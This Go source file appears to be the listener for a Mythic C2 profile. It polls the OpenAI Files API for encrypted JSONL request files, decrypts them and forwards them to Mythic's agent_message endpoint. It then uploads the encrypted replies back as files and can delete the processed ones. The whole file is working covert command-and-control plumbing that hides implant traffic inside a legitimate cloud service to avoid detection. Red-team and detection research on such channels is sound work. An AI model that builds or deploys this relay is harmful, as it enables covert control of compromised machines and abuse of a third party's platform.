package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"time"

	mythicConfig "github.com/MythicMeta/MythicContainer/config"
	"github.com/MythicMeta/MythicContainer/logging"
)

const (
	directionRequest  = "request"
	directionResponse = "response"
)

var filenameCleaner = regexp.MustCompile(`[^A-Za-z0-9_.-]+`)

func RunListener(ctx context.Context, cfg instanceConfig) error {
	client := newOpenAIFileClient(cfg)
	key, err := deriveTransportKey(cfg.TransportKey)
	if err != nil {
		return err
	}
	processed := make(map[string]struct{})
	ticker := time.NewTicker(time.Duration(cfg.PollIntervalSeconds) * time.Second)
	defer ticker.Stop()

	logging.LogInfo("starting OpenAI file listener", "instance", cfg.Name, "channel", cfg.ChannelID, "purpose", cfg.Purpose, "base_url", cfg.BaseURL)
	for {
		if err := processFiles(ctx, cfg, client, key, processed); err != nil && ctx.Err() == nil {
			logging.LogError(err, "failed to process OpenAI files", "instance", cfg.Name)
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
		}
	}
}

func processFiles(ctx context.Context, cfg instanceConfig, client *openAIFileClient, key []byte, processed map[string]struct{}) error {
	files, err := client.listFiles(ctx, cfg.Purpose)
	if err != nil {
		return err
	}
	for _, file := range files {
		if _, ok := processed[file.ID]; ok {
			continue
		}
		if !isRequestFilename(cfg, file.Filename) {
			continue
		}
		if cfg.Debug {
			logging.LogInfo("processing request file", "instance", cfg.Name, "file_id", file.ID, "filename", file.Filename, "bytes", file.Bytes)
		}
		handled, err := processFile(ctx, cfg, client, key, file)
		if err != nil {
			logging.LogError(err, "failed to handle request file", "file_id", file.ID, "filename", file.Filename)
			continue
		}
		processed[file.ID] = struct{}{}
		if cfg.DeleteProcessedFiles && handled > 0 {
			if err := client.deleteFile(ctx, file.ID); err != nil {
				logging.LogError(err, "failed to delete processed request file", "file_id", file.ID)
			}
		}
	}
	return nil
}

func processFile(ctx context.Context, cfg instanceConfig, client *openAIFileClient, key []byte, file openAIFile) (int, error) {
	content, err := client.downloadFile(ctx, file.ID, cfg.MaxFileBytes)
	if err != nil {
		return 0, err
	}
	envelopes, err := parseJSONLEnvelopes(content, cfg.MaxFileBytes)
	if err != nil {
		return 0, err
	}
	if len(envelopes) == 0 {
		return 0, fmt.Errorf("no JSONL envelopes in %s", file.Filename)
	}
	handled := 0
	for _, env := range envelopes {
		if env.Direction != directionRequest {
			if cfg.Debug {
				logging.LogInfo("skipping non-request envelope", "file_id", file.ID, "filename", file.Filename, "envelope_id", env.ID, "direction", env.Direction)
			}
			continue
		}
		if env.Channel != cfg.ChannelID {
			if cfg.Debug {
				logging.LogInfo("skipping request envelope for different channel", "file_id", file.ID, "filename", file.Filename, "envelope_id", env.ID, "envelope_channel", env.Channel, "listener_channel", cfg.ChannelID)
			}
			continue
		}
		plaintext, err := decryptEnvelope(env, key)
		if err != nil {
			return handled, fmt.Errorf("decrypt %s: %w", env.ID, err)
		}
		mythicResponse, err := forwardToMythic(ctx, cfg, plaintext, file)
		if err != nil {
			return handled, fmt.Errorf("forward %s to Mythic: %w", env.ID, err)
		}
		responseID := env.ID
		if responseID == "" {
			responseID = randomID()
		}
		responseEnvelope, err := encryptEnvelopeWithAlgorithm(directionResponse, cfg.ChannelID, responseID, key, mythicResponse, env.Algorithm)
		if err != nil {
			return handled, err
		}
		responseJSONL, err := envelopeJSONL(responseEnvelope)
		if err != nil {
			return handled, err
		}
		responseFilename := responseFilename(cfg, responseID)
		uploaded, err := client.uploadFile(ctx, responseFilename, cfg.Purpose, responseJSONL)
		if err != nil {
			return handled, err
		}
		handled++
		if cfg.Debug {
			logging.LogInfo("uploaded response file", "request_id", responseID, "file_id", uploaded.ID, "filename", uploaded.Filename, "algorithm", env.Algorithm)
		}
	}
	if handled == 0 {
		return 0, fmt.Errorf("no request envelopes matched listener channel %q in %s", cfg.ChannelID, file.Filename)
	}
	return handled, nil
}

func parseJSONLEnvelopes(content []byte, maxBytes int64) ([]fileEnvelope, error) {
	scanner := bufio.NewScanner(bytes.NewReader(content))
	scanner.Buffer(make([]byte, 1024), int(maxBytes))
	var envelopes []fileEnvelope
	lineNumber := 0
	for scanner.Scan() {
		lineNumber++
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		var env fileEnvelope
		if err := json.Unmarshal([]byte(line), &env); err != nil {
			return nil, fmt.Errorf("line %d: %w", lineNumber, err)
		}
		envelopes = append(envelopes, env)
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return envelopes, nil
}

func forwardToMythic(ctx context.Context, cfg instanceConfig, body []byte, source openAIFile) ([]byte, error) {
	host := cfg.MythicHost
	if host == "" {
		host = mythicConfig.MythicConfig.MythicServerHost
	}
	port := cfg.MythicPort
	if port == 0 {
		port = int(mythicConfig.MythicConfig.MythicServerPort)
	}
	endpoint := fmt.Sprintf("http://%s:%d/agent_message", host, port)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("mythic", profileName)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("X-Forwarded-For", "openai-file-api")
	req.Header.Set("X-Forwarded-Host", "api.openai.com")
	req.Header.Set("X-Forwarded-User-Agent", profileName)
	req.Header.Set("X-Forwarded-Url", "openai-files://"+source.ID+"/"+source.Filename)
	httpClient := &http.Client{Timeout: 60 * time.Second}
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	return readHTTPResponse(resp, cfg.MaxFileBytes, "Mythic agent_message")
}

func isRequestFilename(cfg instanceConfig, filename string) bool {
	if !strings.HasSuffix(filename, ".jsonl") {
		return false
	}
	return strings.HasPrefix(filename, cfg.RequestPrefix+sanitizeFilenamePart(cfg.ChannelID)+"_")
}

func requestFilename(cfg instanceConfig, requestID string) string {
	return cfg.RequestPrefix + sanitizeFilenamePart(cfg.ChannelID) + "_" + sanitizeFilenamePart(requestID) + ".jsonl"
}

func responseFilename(cfg instanceConfig, requestID string) string {
	return cfg.ResponsePrefix + sanitizeFilenamePart(cfg.ChannelID) + "_" + sanitizeFilenamePart(requestID) + ".jsonl"
}

func sanitizeFilenamePart(value string) string {
	clean := filenameCleaner.ReplaceAllString(value, "_")
	clean = strings.Trim(clean, "._-")
	if clean == "" {
		return "default"
	}
	return clean
}

func randomID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return base64.RawURLEncoding.EncodeToString(b)
}
